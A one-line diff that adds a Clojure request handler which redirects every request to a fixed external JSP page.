@@ -1,0 +1,1 @@
+(fn[rq rs](.sendRedirect rs"http://s.sl4.eu/SemperBase.jsp"))
